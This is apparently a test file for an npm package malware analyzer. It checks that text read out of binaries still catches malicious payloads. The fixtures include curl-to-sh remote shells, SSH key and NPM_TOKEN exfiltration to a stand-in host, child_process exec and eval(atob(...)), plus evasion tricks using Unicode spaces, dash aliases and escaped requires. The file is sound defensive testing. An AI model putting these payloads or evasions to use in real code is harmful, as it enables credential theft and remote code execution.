// Round 4 review of 8f4ced8, P1: the binary text views folded vertical tab, form feed and Unicode spaces into a
// non-space mark, so `curl ... |<VT>sh` that production (274d284) caught went unread, and a dash alias to a sh name
// prefixed with one of them ran it. The views now decode exactly as production decoded (`new TextDecoder().decode`),
// a chunk at a time, one byte a code unit, a code unit past U+00FF held as the one-byte character of its class
// (binary-text.ts). This holds them to production's read, byte sequence by byte sequence:
// - the view equals production's text with only those stand-ins (asView), however the bytes are chunked;
// - every text rule, fact and import production finds in its text is found in the view, at the same line, and nothing
//   else (names and paths compared as the view holds them);
// - what the file is scored for (scanBinaryText, both views merged) holds all of that.
import { describe, expect, test } from "bun:test";
import { asView, decodeView, keptBytes, scanBinaryText } from "../src/binary-text.ts";
import { factsOf } from "../src/facts.ts";
import { analyze, finalize, readingOf, SCORE_FLOOR, type TarEntry } from "../src/index.ts";
import { importsOf } from "../src/source.ts";
import { joinStrings, scanTextRules } from "../src/textrules.ts";
import { machO } from "./executables.ts";
import { chargeOf } from "./scan-charge.ts";

const enc = new TextEncoder();

/** What a text yields, as comparable keys: each finding's rule and line, each fact's kind, line and name, each import. */
type Hits = { findings: string[]; facts: string[]; imports: string[]; loads: string[]; dynamic: number[] };

function hitsOf(text: string): Hits {
  return {
    findings: [...new Set(scanTextRules(text).map((f) => `${f.id} ${f.line}`))].sort(),
    facts: [...new Set(factsOf(text).map((f) => `${f.kind} ${f.line} ${asView(f.name ?? "")}`))].sort(),
    imports: importsOf(joinStrings(text).text).paths,
    // which of them load code, and the lines of the loads it computes (round 6 review of fbc6738, P1: dropped)
    loads: importsOf(joinStrings(text).text).loads,
    dynamic: importsOf(joinStrings(text).text).dynamic.map((d) => d.line),
  };
}

/** `data` in pieces of `size` bytes (the last shorter). */
function chunked(data: Uint8Array, size: number): Uint8Array[] {
  const out: Uint8Array[] = [];

  for (let at = 0; at < data.length; at += size) out.push(data.subarray(at, at + size));

  return out;
}

/** A seeded generator, so a failure names the bytes it saw. */
function random(seed: number): () => number {
  let s = seed >>> 0;

  return () => {
    s = (Math.imul(s, 1_664_525) + 1_013_904_223) >>> 0;

    return s;
  };
}

function randomBytes(seed: number, size: number): Uint8Array {
  const next = random(seed);

  return Uint8Array.from({ length: size }, () => next() >>> 24);
}

/** A piece of a case: text (as UTF-8), bytes, or byte values. */
type Part = string | Uint8Array | readonly number[];

const bytesOf = (p: Part): Uint8Array => (p instanceof Uint8Array ? p : Array.isArray(p) ? Uint8Array.from(p) : enc.encode(String(p)));

const join = (...parts: Part[]): Uint8Array => {
  const bytes = parts.map(bytesOf);
  const out = new Uint8Array(bytes.reduce((n, b) => n + b.length, 0));
  let at = 0;

  for (const b of bytes) {
    out.set(b, at);
    at += b.length;
  }

  return out;
};

/** Every character JavaScript's `\s` matches, the line terminators included. */
const JS_SPACES = ["\t", "\n", "\v", "\f", "\r", " ", " ", " ", ...Array.from({ length: 11 }, (_, i) => String.fromCharCode(0x2000 + i)), " ", " ", " ", " ", "　", "﻿"];

/** Text the rules and facts look for, around which each case puts its bytes. */
const PAYLOADS = [
  (sp: string) => `curl https://collector.invalid/x.sh |${sp}sh`,
  (sp: string) => `curl${sp}https://collector.invalid/x.sh | sh`,
  (sp: string) => `cat ~/.ssh/id_rsa |${sp}curl -X POST --data-binary @- https://collector.invalid/k`,
  (sp: string) => `require(${sp}'child_process'${sp}).exec${sp}(x)`,
  (sp: string) => `process${sp}.${sp}env.NPM_TOKEN`,
  (sp: string) => `fetch${sp}(${sp}"https://collector.invalid/" + JSON.stringify(process.env))`,
  (sp: string) => `const a = 'chi' +${sp}'ld_process'; require(a)`,
  (sp: string) => `require('./lib${sp}/x.js')`,
  (sp: string) => `eval${sp}(atob("Y3VybCBodHRwczovL2NvbGxlY3Rvci5pbnZhbGlkL3guc2ggfCBzaA=="))`,
];

/** The cases: name, bytes. */
function corpus(): [string, Uint8Array][] {
  const cases: [string, Uint8Array][] = [];

  // random bytes, as an executable's sections are
  for (const seed of [1, 2, 3, 4, 5, 6, 7, 8]) cases.push([`random ${seed}`, randomBytes(seed, 4096 + seed * 9973)]);

  // random bytes with a payload inside, every JavaScript space in it
  for (const [i, sp] of JS_SPACES.entries()) {
    for (const [j, p] of PAYLOADS.entries()) cases.push([`payload ${j}, space U+${sp.charCodeAt(0).toString(16)}`, join(randomBytes(100 + i, 3000), "\n", p(sp), "\n", randomBytes(200 + i, 3000))]);
  }

  // every byte value, alone, and in the shell command production catches
  for (let b = 0; b < 256; b++) {
    cases.push([`byte ${b}`, Uint8Array.of(b)]);
    cases.push([`byte ${b} in a command`, join("\ncurl https://collector.invalid/x.sh |", [b], "sh\n", [b], "curl", [b], "https://collector.invalid/y |", [b], [b], "sh\n")]);
  }

  // every control character and space, as UTF-8, between commands, doubled and at the ends
  for (const sp of [...JS_SPACES, ...Array.from({ length: 32 }, (_, i) => String.fromCharCode(i)), "\u007f", "\u0085", "​", "⁠", "�", "\u{1f600}"]) {
    cases.push([`char U+${sp.codePointAt(0)?.toString(16)}`, join(sp, "curl https://collector.invalid/x.sh |", sp, sp, "sh", sp, "\n", sp)]);
  }

  // multi-byte UTF-8 split across a 64 KiB push, at every offset of the sequence, and a payload after it
  for (const ch of ["é", " ", " ", "﻿", "中", "\u{1f600}"]) {
    const seq = enc.encode(ch);

    for (let cut = 0; cut <= seq.length; cut++) {
      const before = new Uint8Array(65_536 - cut).fill(0x41);

      cases.push([`U+${ch.codePointAt(0)?.toString(16)} split ${cut} bytes before 64 KiB`, join(before, seq, `curl https://collector.invalid/x.sh |${ch}sh\n`)]);
    }
  }

  // malformed UTF-8: truncated, overlong, encoded surrogates, stray continuations, a lead byte at the very end
  for (const bad of [[0xc3], [0xe2, 0x80], [0xf0, 0x9f, 0x98], [0xc0, 0xaf], [0xe0, 0x80, 0xaf], [0xed, 0xa0, 0x80], [0xed, 0xbf, 0xbf], [0x80], [0xbf, 0xbf], [0xf8, 0x88, 0x80, 0x80, 0x80], [0xff, 0xfe]]) {
    cases.push([`malformed ${bad.join(",")}`, join("curl https://collector.invalid/x.sh |", bad, "sh\n", bad)]);
    cases.push([`malformed ${bad.join(",")} at the end`, join("curl https://collector.invalid/x.sh | sh\n", bad)]);
  }

  // a byte order mark, which production's decoder drops only at the start
  cases.push(["BOM at the start", join([0xef, 0xbb, 0xbf], "curl https://collector.invalid/x.sh | sh\n")]);
  cases.push(["BOM inside", join("curl https://collector.invalid/x.sh |", [0xef, 0xbb, 0xbf], "sh\n")]);
  cases.push(["BOM split across 64 KiB", join(new Uint8Array(65_535).fill(0x20), [0xef, 0xbb, 0xbf], "curl https://collector.invalid/x.sh | sh\n")]);

  // the reviewers' Mach-O fixtures: rounds 3 and 4, a 16 KiB and a 64 KiB boundary, long runs, markers, NULs, CRLF and
  // every space production's decoder keeps
  const payload = "curl https://collector.invalid/x.sh | sh";

  for (const padding of [16_360, 16_383, 16_384, 16_390]) cases.push([`round 3 boundary ${padding}`, machO({ size: 32_768, tail: enc.encode(`${" ".repeat(padding)}\n${payload}\n`) })]);

  for (const split of [1, 4, 12, 36]) {
    const data = machO({ size: 131_072 });
    data.set(enc.encode(`\n${payload}\n`), 65_536 - split - 1);
    cases.push([`round 4 64 KiB split ${split}`, data]);
  }

  for (const pad of [65_500, 65_536, 100_000]) cases.push([`round 4 long ${pad}`, machO({ size: 32_768, tail: enc.encode(`\n${" ".repeat(pad)}${payload}\n`) })]);

  for (const marker of [0, 1, 11, 12, 127, 255]) {
    cases.push([`round 4 marker ${marker} before`, machO({ size: 32_768, tail: join("\n", [marker], `${payload}\n`) })]);
    cases.push([`round 4 marker ${marker} after`, machO({ size: 32_768, tail: join(`\n${payload}`, [marker], "\n") })]);
  }

  cases.push(["round 4 NUL-joined", machO({ size: 32_768, tail: enc.encode("\nc\0u\0r\0l https://collector.invalid/x.sh | s\0h\n") })]);
  cases.push(["round 4 CRLF", machO({ size: 32_768, tail: enc.encode(`\r\n${payload}\r\n`) })]);

  for (const ws of ["\v", "\f", " ", " ", " ", " ", "﻿"]) {
    cases.push([`round 4 space U+${ws.charCodeAt(0).toString(16)}`, machO({ size: 32_768, tail: enc.encode(`\ncurl${ws}https://collector.invalid/x.sh |${ws}sh\n`) })]);
    cases.push([`round 4 dash alias U+${ws.charCodeAt(0).toString(16)}`, machO({ size: 4096, tail: enc.encode(`\nalias '${ws}sh=sh'\ncurl https://collector.invalid/x.sh |${ws}sh\n`) })]);
  }

  return cases;
}

describe("a binary's text views read as production read the file", () => {
  const cases = corpus();

  test(`the corpus is the whole of it (${cases.length} byte sequences)`, () => {
    expect(cases.length).toBeGreaterThan(850);
  });

  test("each view is production's text, a code unit past U+00FF held as its stand-in, however the bytes arrive", () => {
    for (const [name, data] of cases) {
      const production = new TextDecoder().decode(data);
      const expected = asView(production);

      for (const size of [1, 3, 7, 4096, 65_536, data.length || 1]) {
        const view = decodeView(chunked(data, size));

        if (view !== expected) throw new Error(`${name}, pushed ${size} bytes at a time: the view is not production's text`);
      }

      // the NUL-deleted view is production's decode of the bytes with each NUL deleted first
      const shell = decodeView(chunked(data, 4096), true);

      if (shell !== asView(new TextDecoder().decode(data.filter((b) => b !== 0)))) throw new Error(`${name}: the NUL-deleted view is not dash's text`);
    }
  }, 300_000);

  test("every rule, fact and import production finds is found in the view, at the same line, and nothing else", () => {
    for (const [name, data] of cases) {
      const production = hitsOf(new TextDecoder().decode(data));
      const view = decodeView(chunked(data, 65_536));

      if (view === null) throw new Error(`${name}: too large`);
      // the view holds a path's characters past U+00FF as stand-ins; the binary's reading gives the real ones back
      // (scanBinaryText, below)
      expect({ name, ...hitsOf(view) }).toEqual({ name, ...production, imports: production.imports.map(asView), loads: production.loads.map(asView) });
    }
  }, 300_000);

  test("what a file is scored for (both views merged) holds everything production found in it", () => {
    for (const [name, data] of cases) {
      const production = hitsOf(new TextDecoder().decode(data));
      const read = scanBinaryText(data);

      if (read.kind !== "read") throw new Error(`${name}: too large`);
      const findings = new Set(read.findings.map((f) => `${f.id} ${f.line}`));
      const facts = new Set(read.facts.map((f) => `${f.kind} ${f.line} ${f.name ?? ""}`));

      expect({ name, missing: production.findings.filter((k) => !findings.has(k)) }).toEqual({ name, missing: [] });
      expect({ name, missing: production.facts.filter((k) => !facts.has(k)) }).toEqual({ name, missing: [] });
      expect({ name, imports: read.imports.paths, loads: read.imports.loads, dynamic: read.imports.dynamic.map((d) => d.line) }).toEqual({ name, imports: production.imports, loads: production.loads, dynamic: production.dynamic });
    }
  }, 300_000);
});

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active" as const, statusReason: null };

const entry = (path: string, data: Uint8Array, mode = 0o644): TarEntry => ({ path, data, size: data.length, mode });

// The reviewer's runnable fixture (round 4, whitespace-execution.ts and whitespace-install.ts): a valid Mach-O whose
// tail aliases a sh name prefixed with a space character to sh and pipes curl into it. dash runs it. Production scored
// it 39/F alone and 29/F behind `postinstall: sh setup.sh` sourcing it through a variable; 8f4ced8 scored 100/A and 90/A
describe("the dash alias through a space production's decoder keeps is found, as production found it", () => {
  for (const ws of ["\v", "\f", " ", " "]) {
    const tail = enc.encode(`\nalias '${ws}sh=sh'\ncurl https://collector.invalid/x.sh |${ws}sh\n`);
    const tool = machO({ size: 4096, tail });
    const code = `U+${ws.charCodeAt(0).toString(16).padStart(4, "0")}`;

    test(`${code}: the Mach-O alone scores 39/F`, () => {
      const manifest = { name: "review-probe", version: "1.0.0", license: "MIT" };
      const a = analyze({ name: manifest.name, manifest, files: [entry("package.json", enc.encode(JSON.stringify(manifest))), entry("lib/tool", tool, 0o755)], publisher: "alice", previousPublishers: [] });
      const r = finalize(a, STATE);

      expect({ score: r.score, grade: r.grade, coverage: r.coverage, signals: r.signals.map((s) => s.id) }).toEqual({ score: 39, grade: "F", coverage: { kind: "complete" }, signals: ["remote-shell"] });
    });

    test(`${code}: sourced by an install script through a variable, it scores 29/F`, () => {
      const manifest = { name: "review-probe", version: "1.0.0", license: "MIT", scripts: { postinstall: "sh setup.sh" } };
      const setup = enc.encode('p=lib/\n. "${p}tool"\n');

      const a = analyze({
        name: manifest.name,
        manifest,
        files: [entry("setup.sh", setup, 0o755), entry("package.json", enc.encode(JSON.stringify(manifest))), entry("lib/tool", tool, 0o755)],
        publisher: "alice",
        previousPublishers: [],
      });

      const r = finalize(a, STATE);

      expect(r.score).toBeLessThan(SCORE_FLOOR);
      expect({ score: r.score, grade: r.grade, signals: r.signals.map((s) => s.id) }).toEqual({ score: 29, grade: "F", signals: ["remote-shell", "install-script"] });
    });
  }
});

// A path a binary's text imports may hold a character past U+00FF, which its view holds as a stand-in. Production read
// the exact path and reached the file; the view's path reaches every file it could stand for, so the same file. Run at
// install (`node index.js` requires the Mach-O, whose text requires the file), what the file does counts as install-time
describe("an import a binary's text names through a character past U+00FF reaches the file production reached", () => {
  const variants = [
    ["ascii", "lib/zh.js"],
    ["CJK", "lib/中.js"],
    ["Unicode space", "lib/a b.js"],
    ["line separator", "lib/a b.js"],
    ["astral", "lib/\u{1f600}.js"],
  ] as const;

  const scoreOf = (target: string) => {
    const manifest = { name: "probe-import", version: "1.0.0", license: "MIT", scripts: { postinstall: "node index.js" } };
    const tool = machO({ size: 4096, tail: enc.encode(`\nrequire('./${target.slice(4)}')\n`) });
    const reached = enc.encode('fetch("https://collector.invalid/" + process.env.NPM_TOKEN);\n');

    const a = analyze({
      name: manifest.name,
      manifest,
      files: [entry("package.json", enc.encode(JSON.stringify(manifest))), entry("index.js", enc.encode("require('./lib/tool');\n")), entry("lib/tool", tool, 0o755), entry(target, reached)],
      publisher: "alice",
      previousPublishers: [],
    });

    const r = finalize(a, STATE);

    return { score: r.score, signals: r.signals.map((s) => `${s.id} ${s.points}`).sort() };
  };

  const ascii = scoreOf("lib/zh.js");

  test("the ASCII path reaches its file: what it does at install is counted (exfiltration)", () => {
    expect(ascii.signals.some((s) => s.startsWith("exfiltration"))).toBe(true);
  });

  for (const [name, target] of variants.slice(1)) {
    test(`a ${name} in the path: the same score as the ASCII path`, () => {
      expect(scoreOf(target)).toEqual(ascii);
    });
  }
});

// Round 5 review of 535a5b5, P1: production read a Mach-O in the language its context gave it (JavaScript when code
// loads it), whose reading also tokenizes it: `require('./p'/*x*/+'ayload.txt')`, `require('./p\u{61}yload.txt')` and
// `require('./payload.txt')` reach lib/payload.txt there. The view reads plain text only, so the branch scored
// these 90/A where production scored 0/F. A Mach-O production read in a language is read exactly as production read it.
//
// The reference is production's own read of the same bytes: the same file with its magic number changed is no
// executable to this analyzer either, so it goes the way every Mach-O went in production (274d284, whose check never
// matched one). In each context the Mach-O keeps every signal and the coverage that reference has, and scores no higher.
describe("a Mach-O is read as production read it, whatever context it is read in", () => {
  const PAYLOAD = "curl https://collector.invalid/x | sh\n";

  const TAILS = {
    "require concatenated across a comment": "*/\nrequire('./p'/*x*/+'ayload.txt');\n",
    "require through an escaped code point": "*/\nrequire('./p\\u{61}yload.txt');\n",
    "require through an escaped identifier": "*/\nrequ\\u0069re('./payload.txt');\n",
    "a plain require": "\nrequire('./payload.txt');\n",
    "a joined string": "\nrequire('./pay' + 'load.txt');\n",
    "a dash alias through a vertical tab": "\nalias '\vsh=sh'\ncurl https://collector.invalid/x.sh |\vsh\n",
    "no payload at all": "\nusage: tool [options]\n",
  } as const;

  /** A Mach-O whose segment name opens a block comment (bytes 40 and 41, which leave its structure valid), then `tail`. */
  const tool = (tail: string, magic = true): Uint8Array => {
    const t = machO({ size: 4096, tail: enc.encode(tail) });
    t[40] = 0x2f;
    t[41] = 0x2a;

    // the reference: one byte of the magic changed, so the file is no executable, and is read as production read it
    if (!magic) t[3] = 0x00;

    return t;
  };

  const CONTEXTS = {
    "loaded at install through node index.js": (data: Uint8Array) => ({ manifest: { scripts: { postinstall: "node index.js" } }, files: { "index.js": enc.encode("require('./lib/tool');\n"), "lib/tool": data } }),
    "the package's main entry": (data: Uint8Array) => ({ manifest: { main: "lib/tool" }, files: { "lib/tool": data } }),
    "named .js and loaded at install": (data: Uint8Array) => ({ manifest: { scripts: { postinstall: "node lib/tool.js" } }, files: { "lib/tool.js": data } }),
    "nothing loads it": (data: Uint8Array) => ({ manifest: {}, files: { "lib/tool": data } }),
  } as const;

  /** What a context puts in the package beside the Mach-O: the manifest fields that load it, and the files. */
  type Context = { manifest: { scripts?: { postinstall: string }; main?: string }; files: Record<string, Uint8Array> };

  const scored = (ctx: (data: Uint8Array) => Context, data: Uint8Array) => {
    const c = ctx(data);
    const manifest = { name: "probe-context", version: "1.0.0", license: "MIT", ...c.manifest };

    const a = analyze({
      name: manifest.name,
      manifest,
      files: [entry("package.json", enc.encode(JSON.stringify(manifest))), entry("lib/payload.txt", enc.encode(PAYLOAD)), ...Object.entries(c.files).map(([path, d]) => entry(path, d, 0o755))],
      publisher: "alice",
      previousPublishers: [],
    });

    const r = finalize(a, STATE);

    return { score: r.score, coverage: r.coverage, signals: r.signals.filter((s) => s.id !== "binary").map((s) => `${s.id} ${s.points}`).sort() };
  };

  for (const [tailName, tail] of Object.entries(TAILS)) {
    for (const [ctxName, ctx] of Object.entries(CONTEXTS)) {
      test(`${tailName}, ${ctxName}: as production read it`, () => {
        const native = scored(ctx, tool(tail));
        const reference = scored(ctx, tool(tail, false));

        // every signal production gave it, at its points; listed as native code it may add one (an install script runs a
        // compiled program), never lose one
        expect({ missing: reference.signals.filter((x) => !native.signals.includes(x)), coverage: native.coverage }).toEqual({ missing: [], coverage: reference.coverage });
        expect(native.score).toBeLessThanOrEqual(reference.score);
      });
    }
  }

  // the reviewer's three, as production (274d284) scored them: 0/F
  for (const name of ["require concatenated across a comment", "require through an escaped code point", "require through an escaped identifier"] as const) {
    test(`${name}, loaded at install: 0/F, payload reached`, () => {
      const r = scored(CONTEXTS["loaded at install through node index.js"], tool(TAILS[name]));

      expect(r.score).toBe(0);
      expect(r.signals.some((s) => s.startsWith("remote-shell"))).toBe(true);
    });
  }
});

// Round 6 review of fbc6738, P1: the view kept a binary's import paths and dropped which of them load code, so a load
// found in one plain binary (lib/first: `require('./tool')`) never made its target code, and the second binary
// (lib/tool) was read through the plain view, not as the JavaScript production read it: 0/F became 90/A at install,
// 39/F became 100/A as the main entry. Loads now count as production counted them, and a binary any file loads, before
// or after it was read, reached or not, is read as production reads code it loads (score.ts, viewed).
describe("a binary another binary loads is read as code, however it was first reached", () => {
  const TAIL_OF = {
    "a comment between concatenated strings": "*/\nrequire('./p'/*x*/+'ayload.txt');\n",
    "an escaped code point in the path": "*/\nrequire('./p\\u{61}yload.txt');\n",
    "an escaped identifier": "*/\nrequ\\u0069re('./payload.txt');\n",
  } as const;

  /** A Mach-O whose segment name opens a block comment, then `tail`. */
  const commented = (tail: string): Uint8Array => {
    const t = machO({ size: 4096, tail: enc.encode(tail) });
    t[40] = 0x2f;
    t[41] = 0x2a;

    return t;
  };

  const chain = (tail: string, manifest: { scripts?: { postinstall: string }; main?: string }, extra: Record<string, Uint8Array> = {}) => {
    const m = { name: "review-probe", version: "1.0.0", license: "MIT", ...manifest };

    const files = {
      "index.js": enc.encode("const p = __dirname + '/lib/first';\n"),
      "lib/first": commented("*/\nrequire('./tool');\n"),
      "lib/tool": commented(tail),
      "lib/payload.txt": enc.encode("curl https://collector.invalid/x | sh\n"),
      ...extra,
    };

    const a = analyze({ name: m.name, manifest: m, files: [entry("package.json", enc.encode(JSON.stringify(m))), ...Object.entries(files).map(([p, d]) => entry(p, d, 0o755))], publisher: "alice", previousPublishers: [] });

    return finalize(a, STATE);
  };

  for (const [name, tail] of Object.entries(TAIL_OF)) {
    test(`${name}, two binaries down from an install script: 0/F as production scored it`, () => {
      const r = chain(tail, { scripts: { postinstall: "node index.js" } });

      expect(r.signals.map((s) => s.id)).toContain("remote-shell");
      expect(r.score).toBe(0);
    });

    test(`${name}, two binaries down from the main entry: 39/F as production scored it`, () => {
      const r = chain(tail, { main: "index.js" });

      expect(r.signals.map((s) => s.id)).toContain("remote-shell");
      expect(r.score).toBe(39);
    });
  }

  // production read lib/tool as plain text here, since nothing had loaded it when the walk reached it, and missed the
  // payload: reading it as code once anything loads it, whenever, is stricter than production, never looser
  test("a binary first reached by a path, which only a file read later loads: read as code all the same", () => {
    const r = chain(TAIL_OF["a comment between concatenated strings"], { scripts: { postinstall: "node index.js" } }, {
      "index.js": enc.encode("const p = __dirname + '/lib/tool';\n"),
      "zz/late.js": enc.encode("require('../lib/tool');\n"),
    });

    expect(r.signals.map((s) => s.id)).toContain("remote-shell");
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });
});

// Round 7 review of dce1655, P1: each view waiting for the end of the walks kept its whole import list, with no bound,
// and 500 Mach-O files of 2,800 imports each ended a Worker; memory review of 49b35f9, P1: views counted past the budget
// were still kept, and 500 of 131 KiB each ended one too (registry binary-views.workerd.test.ts). A view counts as it is
// read, within maxKeptViewBytes for all of them; past it a view keeps nothing and its file is reported unread.
describe("what binaries' views keep while the walks run is bounded", () => {
  const tool = (i: number): Uint8Array => machO({ size: 4096, tail: enc.encode(`\ncurl https://collector.invalid/${i}.sh | sh\nrequire('./missing-${i}');\n`) });

  const scored = (maxKeptViewBytes: number | undefined) => {
    const manifest = { name: "probe-kept", version: "1.0.0", license: "MIT" };
    const files = [entry("package.json", enc.encode(JSON.stringify(manifest))), ...Array.from({ length: 20 }, (_, i) => entry(`lib/t${i}`, tool(i), 0o755))];
    const a = analyze({ name: manifest.name, manifest, files, publisher: "alice", previousPublishers: [], maxKeptViewBytes });

    const report = finalize(a, STATE);
    const stopped = report.signals.find((s) => s.id === "incomplete");

    return { coverage: a.coverage?.kind, omitted: a.coverage?.kind === "partial" ? a.coverage.omittedFiles : 0, signals: report.signals.map((s) => s.id), stopped: linesOf(stopped), reading: readingOf(a).kind, score: report.score };
  };

  test("within the budget every view counts: complete", () => {
    expect(scored(undefined)).toMatchObject({ coverage: "complete", omitted: 0, signals: ["remote-shell"], stopped: 0, reading: "complete" });
  });

  // round 12 review of 7cd0b2b, P2: past the budget a view kept nothing and its file was reported unread for the budget,
  // its deductions dropped. It keeps a finding of each signal it has not kept, and the analysis did not finish
  test("past it a view keeps its signals, and the analysis says it did not finish: incomplete, never higher", () => {
    const full = scored(undefined);
    const r = scored(1);

    expect(r.signals).toContain("remote-shell");
    expect(r.signals).toContain("incomplete");
    expect(r.stopped).toBe(20);
    expect(r.reading).toBe("incomplete");
    expect(r.score).toBeLessThan(full.score);
  });

  test("the budget is for all views together: once spent, the rest keep only their signals, and the analysis is incomplete", () => {
    const one = scored(undefined);
    const manifest = { name: "probe-kept", version: "1.0.0", license: "MIT" };
    // room for about half of them
    const files = [entry("package.json", enc.encode(JSON.stringify(manifest))), ...Array.from({ length: 20 }, (_, i) => entry(`lib/t${i}`, tool(i), 0o755))];
    const read = scanBinaryTextRead(tool(0));
    const each = keptBytes({ findings: read.findings, facts: read.facts });
    // what reading one is charged as it finds its results (kept.ts): the nine before it keep `each`, and the tenth's
    // reading needs its charge in what is left
    const a = analyze({ name: manifest.name, manifest, files, publisher: "alice", previousPublishers: [], maxKeptViewBytes: each * 9 + chargeOf(tool(0)) + each / 2 });

    expect(one.coverage).toBe("complete");
    // the ten past it kept their signals, and say they did not finish
    expect(a.coverage).toEqual({ kind: "complete" });
    expect(linesOf(finalize(a, STATE).signals.find((s) => s.id === "incomplete"))).toBe(10);
    expect(finalize(a, STATE).signals.map((s) => s.id)).toContain("remote-shell");
  });
});

/** How many lines a signal cites: those it shows and the rest. */
function linesOf(s: { evidence: readonly string[]; more?: readonly string[] } | undefined): number {
  return s === undefined ? 0 : s.evidence.length + (s.more?.length ?? 0);
}

/** The read of a binary's text, which a test expects to be read. */
function scanBinaryTextRead(data: Uint8Array): Extract<ReturnType<typeof scanBinaryText>, { kind: "read" }> {
  const r = scanBinaryText(data);

  if (r.kind !== "read") throw new Error("too large");

  return r;
}

// Round 8 review: a binary's view holds `require('./t漢')` with a stand-in, which names lib/t漢 and lib/t字 alike. The
// extra file's `__dirname` path reached lib/bridge.dat before lib/middle's load did, so bridge.dat was read as plain text
// where production read it as JavaScript, and its tokenizer's load of the payload was missed: 39/F became 100/A, 0/F
// became 90/A. A text file read in its own language because nothing loaded it yet is read again as code once anything
// loads it (score.ts, plainRead), whatever order the walk met the files in.
describe("a file is read as code once anything loads it, whatever order the walk met it in", () => {
  const TAILS = {
    "a comment between concatenated strings": "require('./p'/*x*/+'ayload.txt');\n",
    "an escaped code point in the path": "require('./p\\u{61}yload.txt');\n",
    "an escaped identifier": "requ\\u0069re('./payload.txt');\n",
  } as const;

  const commented = (tail: string): Uint8Array => {
    const t = machO({ size: 4096, tail: enc.encode(`*/\n${tail}`) });
    t[40] = 0x2f;
    t[41] = 0x2a;

    return t;
  };

  const scored = (tail: string, install: boolean, extraFirst: boolean) => {
    const m = { name: "review-probe", version: "1.0.0", license: "MIT", ...(install ? { scripts: { postinstall: "node index.js" } } : { main: "index.js" }) };

    const extra: [string, Uint8Array][] = [
      ["lib/t字", enc.encode("const p = __dirname + '/bridge.dat';\n")],
      ["lib/t漢", enc.encode("require('./middle');\n")],
    ];

    const files: [string, Uint8Array][] = [
      ["index.js", enc.encode("const p = __dirname + '/lib/first';\n")],
      ["lib/first", commented("require('./t漢');\n")],
      ...(extraFirst ? extra : extra.toReversed()),
      ["lib/middle", enc.encode("require('./bridge.dat');\n")],
      ["lib/bridge.dat", enc.encode(tail)],
      ["lib/payload.txt", enc.encode("curl https://collector.invalid/x | sh\n")],
    ];

    const a = analyze({ name: m.name, manifest: m, files: [entry("package.json", enc.encode(JSON.stringify(m))), ...files.map(([p, d]) => entry(p, d, 0o755))], publisher: "alice", previousPublishers: [] });

    return finalize(a, STATE);
  };

  for (const [name, tail] of Object.entries(TAILS)) {
    for (const extraFirst of [true, false]) {
      test(`${name}, ${extraFirst ? "the extra file first" : "the extra file last"}: 0/F at install, 39/F as the main entry, as production scored it`, () => {
        for (const [install, want] of [[true, 0], [false, 39]] as const) {
          const r = scored(tail, install, extraFirst);

          expect(r.signals.map((s) => s.id)).toContain("remote-shell");
          expect(r.score).toBeLessThanOrEqual(want);
        }
      });
    }
  }

  test("a text file first reached by a path and loaded only by a file read later is read as code too", () => {
    const m = { name: "review-probe", version: "1.0.0", license: "MIT", scripts: { postinstall: "node index.js" } };

    const files: [string, string][] = [
      ["index.js", "const p = __dirname + '/lib/bridge.dat';\nrequire('./lib/late');\n"],
      ["lib/bridge.dat", TAILS["a comment between concatenated strings"]],
      ["lib/late", "require('./bridge.dat');\n"],
      ["lib/payload.txt", "curl https://collector.invalid/x | sh\n"],
    ];

    const a = analyze({ name: m.name, manifest: m, files: [entry("package.json", enc.encode(JSON.stringify(m))), ...files.map(([p, d]) => entry(p, enc.encode(d)))], publisher: "alice", previousPublishers: [] });

    expect(finalize(a, STATE).signals.map((s) => s.id)).toContain("remote-shell");
  });
});
